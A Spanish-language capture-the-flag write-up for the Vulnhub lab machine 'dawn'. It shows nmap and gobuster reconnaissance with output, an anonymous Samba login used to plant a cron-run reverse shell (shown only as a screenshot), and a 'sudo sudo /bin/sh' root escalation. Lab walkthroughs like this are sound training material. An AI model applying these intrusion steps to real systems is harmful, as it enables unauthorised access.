+++
title = "dawn - Vulnhub"
+++


[link => dawn](https://www.vulnhub.com/entry/sunset-dawn,341/)

---



## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.3.3.0/24
```

![nmaphd](/images/writeups/vulnhub/dawn/nmaphd.png)

### La IP de la máquina objetivo es **10.3.3.20**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.3.3.20 -oN target_scan.nmap
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 15:42 EDT
Initiating ARP Ping Scan at 15:42
Scanning 10.3.3.20 [1 port]
Completed ARP Ping Scan at 15:42, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:42
Scanning 10.3.3.20 [65535 ports]
Discovered open port 139/tcp on 10.3.3.20
Discovered open port 80/tcp on 10.3.3.20
Discovered open port 445/tcp on 10.3.3.20
Discovered open port 3306/tcp on 10.3.3.20
Completed SYN Stealth Scan at 15:42, 1.41s elapsed (65535 total ports)
Nmap scan report for 10.3.3.20
Host is up, received arp-response (0.00013s latency).
Scanned at 2024-03-12 15:42:28 EDT for 2s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 64
139/tcp  open  netbios-ssn  syn-ack ttl 64
445/tcp  open  microsoft-ds syn-ack ttl 64
3306/tcp open  mysql        syn-ack ttl 64
MAC Address: 08:00:27:43:01:ED (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

### **Puertos Abiertos: 80,139,445,3306**

## Ejecución de scripts con nmap

```bash
sudo nmap -sCV -p80,139,445,3306 10.3.3.20 -oN scripts_exec.nmap
```



```bash
Host is up (0.00044s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 12
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, SupportsLoadDataLocal, InteractiveClient, LongColumnFlag, SupportsCompression, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, IgnoreSigpipes, Support41Auth, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: cJ*2\X'TR}Ct?|tS!H'*
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:43:01:ED (Oracle VirtualBox virtual NIC)
Service Info: Host: DAWN

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2024-03-12T15:45:17-04:00
| smb2-time: 
|   date: 2024-03-12T19:45:17
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: DAWN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.56 seconds
```

## Enumeración de directorios con gobuster

```bash
gobuster dir -u http://10.3.3.20/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.3.3.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 293]
/.hta                 (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 293]
/index.html           (Status: 200) [Size: 791]
/logs                 (Status: 301) [Size: 305] [--> http://10.3.3.20/logs/]
/server-status        (Status: 403) [Size: 297]
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================
```

## Archivo management.log encontrado en http://10.3.3.20/logs/

![management.log](/images/writeups/vulnhub/dawn/managementlog.png)

## Registro de cronjob en el contenido del archivo de log 

![cronjob](/images/writeups/vulnhub/dawn/cronjob.png)


## Conexión al servicio samba y subida de archivo web-control que se ejecuta cada cierto tiempo y contiene una reverse shell

```bash
smbclient --no-pass //10.3.3.20/ITDEPT
```

![revshell](/images/writeups/vulnhub/dawn/revshell.png)

## Privesc

![sudoperms](/images/writeups/vulnhub/dawn/sudoperms.png)

```bash
sudo sudo /bin/sh
```

![flagroot](/images/writeups/vulnhub/dawn/flagroot.png)
